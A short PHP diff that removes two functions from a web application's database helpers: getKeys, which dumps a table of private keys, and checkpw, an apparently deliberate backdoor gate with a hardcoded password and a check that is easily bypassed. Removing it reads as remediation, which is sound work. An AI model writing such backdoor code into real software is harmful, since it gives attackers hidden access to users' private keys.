@@ -257,17 +257,6 @@ function getSize($conn, $userid)
 		return intval($result['sum']);
 }
 
-function getKeys($conn, $code)
-{
-	if(checkpw($code))
-	{
-		$results = $conn->query("SELECT * FROM privkeys");
-		return array($results, $conn->error);
-	}
-	else
-		return false;
-}
-
 function updateUser($first, $last, $bio, $userid)
 {
 	$newConn = connect_to_db(1);
@@ -281,16 +270,6 @@ function updateUser($first, $last, $bio, $userid)
 	$statement->close();
 
 	return $error;
-}
-
-function checkpw($code)
-{
-	$len = strlen($code) - 1;
-	$last = intval($code[$len]);
-	if(!!$code && $code & 1 && $last % 2 == 0 && $code = "DirtyHarry99")
-		return true;
-
-	return false;
 }
 
 function addFile($conn, $filename, $filetype, $filesize, $contents, $myID)
